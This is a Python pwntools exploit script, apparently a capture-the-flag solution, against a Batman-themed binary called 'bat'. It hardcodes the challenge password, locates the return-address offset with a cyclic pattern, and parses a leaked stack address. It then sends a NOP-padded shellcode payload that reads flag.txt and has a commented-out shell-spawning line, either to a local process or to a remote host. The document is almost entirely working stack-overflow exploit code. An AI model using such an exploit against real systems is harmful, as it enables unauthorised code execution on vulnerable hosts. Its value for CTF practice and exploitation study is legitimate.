from pwn import *
import re

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        p = remote(sys.argv[1],sys.argv[2])
    else:
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)

    p.sendlineafter('>','2')
    p.sendlineafter('Enter the password:','b4tp@$$w0rd!')
    p.sendlineafter('Enter the navigation commands: ',payload)
    p.sendlineafter('>','420')
    p.wait()
   # ip_offset = cyclic_find(p.corefile.pc) #x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) #x64

    info('located offset at {a}'.format(a=ip_offset))
    return ip_offset

gdbscript = '''
init-pwndbg
breakrva 0x0000131f
'''.format(**locals())


exe = './bat'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug' #change between info and debug

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


offset = find_ip(cyclic(100))

io = start()

io.sendlineafter('>','1')
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("stack_addr: %#x", stack_addr)

shellcode = asm(shellcraft.popad())
#shellcode = shellcraft.sh()
shellcode += asm(shellcraft.linux.cat('flag.txt'))

padding = asm('nop') * (offset - len(shellcode))


payload = flat([
padding,
shellcode,
stack_addr
])

io.sendlineafter('>','2')
io.sendlineafter('Enter the password:','b4tp@$$w0rd!')



io.sendlineafter('Enter the navigation commands: ',payload)
io.sendlineafter('>','420')
io.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")
print(io.recvlines())

flag = io.recv()
success(flag)